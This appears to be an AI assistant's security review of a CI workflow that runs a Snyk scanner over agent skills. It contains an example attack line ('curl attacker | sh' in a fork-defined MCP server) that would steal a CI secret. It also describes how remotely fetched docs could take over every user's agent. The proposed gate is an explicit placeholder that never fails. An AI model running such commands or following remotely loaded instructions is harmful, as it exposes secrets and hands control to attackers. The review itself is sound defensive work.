**Verdict: do not merge this gate.** The workflow can leak `SNYK_TOKEN` to anyone who opens a fork PR, and the skill itself will probably trip the scanner.

I couldn't load the `snyk-agent-scan-compliance` skill (it errored), so this is from my own knowledge. Check the exact Snyk issue codes against the current scanner docs.

## Blockers

1. **`pull_request_target` plus secret plus fork code is a pwn request.**
   - `pull_request_target` runs with the secret. Scanning fork code means that code is in the workspace.
   - `--dangerously-run-mcp-servers` starts whatever MCP server commands the PR defines. A fork PR adds a server with `curl attacker | sh` and gets `SNYK_TOKEN`.
   - A private repo doesn't fix this. It opens up as soon as the repo goes public, and org members' forks can already trigger it.

2. **The token is written in the env block.**
   - If `<our token>` is the real value, it sits in git history.
   - Rotate it, store it as a repo secret, and reference `${{ secrets.SNYK_TOKEN }}`.

3. **`uvx snyk-agent-scan@latest` is unpinned.**
   - It is third-party code running in the job that holds the secret.
   - Pin an exact version, and pin the actions by commit SHA.

4. **Your fail-check is open-ended.** Cases that pass today:
   - Scan crashes or no report is written: grep finds nothing and the job is green.
   - JSON shape changes: the same silent pass.
   - Only `prompt_injection` is checked: malicious code, toxic flows and third-party-content findings pass.
   - Fix: fail if the report file is missing, empty or invalid JSON. Then fail on a deny-list of issue codes, or on any finding above a severity threshold.

## The skill is the bigger problem

`refresh-docs.sh` curls `docs.pellmoor.dev/agents/latest.md` at run time. `SKILL.md` tells the agent to read it and follow its steps. This is "never stale", but it is also remote instruction loading.

- Whoever controls that URL controls every user's agent. That includes a domain takeover, a CDN compromise, or a bad docs edit.
- Snyk's scanner should flag it as untrusted third-party content in the instruction path. It is a real risk that I'd expect this gate to catch, and your gate may not catch it because it only checks `prompt_injection`.
- Your CI scan only sees the repo at PR time. The fetched content changes after the scan, so the green check proves nothing about what users run.

Options, best first:

1. Ship the docs inside the skill (`references/`). Refresh them in CI on a schedule and open a PR, so a human reviews every change.
2. Fetch a versioned URL and verify a sha256 pinned in the repo. Fail closed on mismatch.
3. In `SKILL.md`, say the fetched file is reference data, not instructions. Never say "follow the steps there". This reduces the risk but does not remove it.

## Safer workflow

```yaml
name: skill-security-scan
on:
  pull_request:          # not pull_request_target: forks get no secrets
    paths: ["skills/**"]
permissions:
  contents: read
jobs:
  scan:
    # Skip forks; a maintainer reruns from a branch in this repo.
    if: github.event.pull_request.head.repo.full_name == github.repository
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@<full-sha>
        with:
          persist-credentials: false
      - uses: astral-sh/setup-uv@<full-sha>
      - name: Scan
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
        run: |
          uvx snyk-agent-scan@<exact-version> --ci --json --skills ./skills > "$RUNNER_TEMP/report.json"
      - name: Gate
        run: |
          test -s "$RUNNER_TEMP/report.json"
          python3 -I -c '
          import json,sys
          r=json.load(open(sys.argv[1]))
          bad=[i for i in str(r).split() if False]  # replace with real schema walk
          ' "$RUNNER_TEMP/report.json"
```

Replace the placeholder gate body with a walk over the real report schema. Print the actual JSON once and read the field names, then fail on your deny-list of codes.

Notes on the workflow:
- It drops `--dangerously-run-mcp-servers`. A skills scan is static and does not need to run servers.
- For fork PRs, use a two-stage design. An unprivileged `pull_request` job uploads the artifact. A `workflow_run` job holds the secret and treats the artifact strictly as data.
- Alternatively, require a maintainer-applied label or an `environment` with required reviewers before the secret job runs.

## Next action (2 minutes)

Rotate `SNYK_TOKEN` if you pasted the real value anywhere. Then tell me which of the three skill options you want, and I'll draft the `refresh-docs.sh` change.